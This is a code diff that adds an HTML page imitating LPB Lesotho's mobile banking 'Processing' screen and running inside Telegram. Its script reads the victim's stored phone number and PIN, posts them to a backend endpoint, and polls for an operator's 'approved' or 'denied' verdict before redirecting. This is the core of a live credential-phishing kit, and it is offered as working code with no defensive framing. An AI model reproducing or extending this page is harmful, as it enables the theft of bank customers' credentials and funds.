@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LPB Lesotho - Processing</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --lpb-blue: #0054a6;        /* LPB Royal Blue */
+            --lpb-blue-mid: #0072bc;      /* MBanking Banner Blue */
+            --lpb-blue-dark: #003e7e;
+            --lpb-green: #00a651;       /* LPB Vibrant Green */
+            --lpb-gold: #a38228;        /* LPB Ochre/Gold Accent */
+            --lpb-gradient: linear-gradient(135deg, #0072bc 0%, #0054a6 100%);
+            --bg-dark: #0c2340;
+            --card-bg: #ffffff;
+            --text-dark: #0054a6;
+            --text-muted: #667788;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Centered Loading Card */
+        .loading-card {
+            background: var(--card-bg);
+            width: 88%;
+            max-width: 380px;
+            padding: 40px 24px;
+            border-radius: 20px;
+            border-bottom: 4px solid var(--lpb-green);
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .brand-tag {
+            font-size: 11px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            color: #ffffff;
+            background-color: var(--lpb-green);
+            padding: 3px 10px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+
+        /* Animated Spinner Circle with LPB Emblem */
+        .loader-circle {
+            width: 110px;
+            height: 110px;
+            background: var(--lpb-gradient);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(0, 84, 166, 0.35);
+        }
+
+        .loader-circle::after {
+            content: '';
+            position: absolute;
+            width: 94px;
+            height: 94px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid var(--lpb-green);
+            border-radius: 50%;
+            animation: spin 1.1s linear infinite;
+        }
+
+        .loader-logo {
+            position: relative;
+            z-index: 2;
+            width: 48px;
+            height: 48px;
+            background: #ffffff;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Dynamic Status Typography */
+        h2 {
+            color: var(--text-dark);
+            font-size: 24px;
+            margin: 0 0 10px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="brand-tag">LPB Lesotho • MBanking</div>
+
+    <div class="loader-circle">
+        <div class="loader-logo">
+            <!-- LPB Mountain Peak Emblem -->
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 3L3 15V22L16 10L29 22V15L16 3Z" fill="#0054a6"/>
+                <path d="M16 16L6 26H26L16 16Z" fill="#00a651"/>
+                <circle cx="16" cy="11.5" r="3" fill="#ffffff"/>
+                <circle cx="16" cy="11.5" r="1.8" fill="#a38228"/>
+            </svg>
+        </div>
+    </div>
+
+    <h2 id="main-text">Processing...</h2>
+    <p id="sub-text">Preparing verification...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    if (!phone) {
+        console.warn("⚠️ No username/phone number found in localStorage");
+    }
+
+    // Send login notification to backend endpoint
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch (err) {
+        console.error("❌ Request error:", err);
+    }
+
+    // Dynamic progress text switch
+    setTimeout(() => {
+        mainText.textContent = "Please wait...";
+        subText.textContent = "This will only take a few seconds";
+    }, 3000);
+
+    // Poll backend status for approval or denial
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "Approved!";
+                subText.textContent = "Opening next page...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "Declined!";
+                subText.textContent = "Incorrect username or password.";
+
+                setTimeout(() => {
+                    window.location.href = "/page6?error=wrongpin";
+                }, 2000);
+            }
+
+        } catch (err) {
+            console.error("❌ Status check failed:", err);
+        }
+    }
+
+    setInterval(checkApproval, 2000);
+});
+</script>
+
+</body>
+</html>
